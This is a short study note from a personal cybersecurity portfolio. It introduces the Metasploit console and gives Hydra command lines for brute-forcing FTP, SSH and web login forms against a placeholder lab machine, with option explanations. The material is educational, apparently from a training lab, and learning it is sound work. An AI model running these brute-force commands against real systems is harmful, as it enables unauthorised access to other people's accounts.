# Metasploit & Hydra

## Metasploit

While using the **Metasploit Framework**, you will primarily interact with the Metasploit console. You can launch it from the AttackBox terminal using the `msfconsole` command. The console will be your main interface to interact with the different **modules** of the Metasploit Framework. Modules are small components built to perform a specific task, such as exploiting a vulnerability, scanning a target, or performing a brute-force attack.

### Useful Commands

```bash
ls
ping -c 1 8.8.8.8
help set
clear
```

## Hydra

**Hydra** is a brute force online password cracking program, a quick system login password "hacking" tool.

### Brute Forcing FTP

```bash
hydra -l user -P passlist.txt ftp://MACHINE_IP
```

### Brute Forcing SSH

```bash
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
```

| Option | Explanation |
|--------|-------------|
| `-l` | Specifies the (SSH) username for login |
| `-P` | Indicates a list of passwords |
| `-t` | Sets the number of threads to spawn |

### Brute Forcing Web Forms

You must know which type of request is being made; **GET** or **POST** methods are commonly used. You can use your browser's network tab (in developer tools) to see the request types or view the source code.

```bash
sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
```

| Option | Explanation |
|--------|-------------|
| `-l` | The username for (web form) login |
| `-P` | The password list to use |
| `http-post-form` | The type of the form is POST |
| `<path>` | The login page URL, for example, `login.php` |
| `<login_credentials>` | The username and password used to log in, e.g., `username=^USER^&password=^PASS^` |
| `<invalid_response>` | Part of the response when the login fails |
| `-V` | Verbose output for every attempt |

### Example: Web Form Attack

```bash
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

- The login page is only `/`, i.e., the main IP address
- `^USER^` will be replaced by the specified username(s)
- `^PASS^` will be replaced by the provided passwords
- `F=incorrect` is a string that appears in the server reply when the login fails

---

_Part of [Cybersecurity Portfolio](https://github.com/Raresney/Cybersecurity-portfolio) by Rares Bighiu_
